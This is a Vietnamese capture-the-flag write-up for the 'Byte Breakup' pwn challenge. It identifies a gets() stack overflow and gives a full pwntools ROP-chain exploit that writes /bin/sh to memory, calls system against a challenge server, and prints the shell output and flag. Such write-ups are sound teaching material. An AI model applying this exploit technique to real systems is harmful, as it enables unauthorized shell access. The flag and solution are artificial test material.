# Byte Breakup
## Analysis
Lỗi buffer overflow
```
void vuln(void) {
  char local_28 [32];
  
  puts("Enter the password: ");
  gets(local_28);
  puts("Wrong password\n");
  return;
}
```
Hàm soClose chỉ là lệnh ls, nhưng ta sẽ tận dụng hàm system
```
void soClose(void) {
  system("/bin/ls");
  return;
}
```
## Solution
Sử dụng kỹ thuật ROPchain
```
#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./vuln", checksec = False)
con = remote("34.125.199.248", 6969)

rdi = 0x00000000004012bb
rw = 0x404080
system = 0x0401257
ret= 0x401243

# Stage 1: ghi /bin/sh\0
payload = b"A" * 0x28 + p64(rdi) + p64(rw) + p64(elf.plt['gets']) 
# Stage 2: pop shell
payload += p64(rdi) + p64(rw) + p64(ret) + p64(system)

con.sendlineafter(b"password:", payload)
con.send(b"/bin/sh\0")

con.interactive()

```
```
└─$ ./exp.py
[+] Opening connection to 34.125.199.248 on port 6969: Done
[*] Switching to interactive mode
Wrong password
$ ls
bin
boot
dev
etc
home
lib
lib32
...
```
## Flag
```
OSCTF{b1t_byt3_8r3akup}
```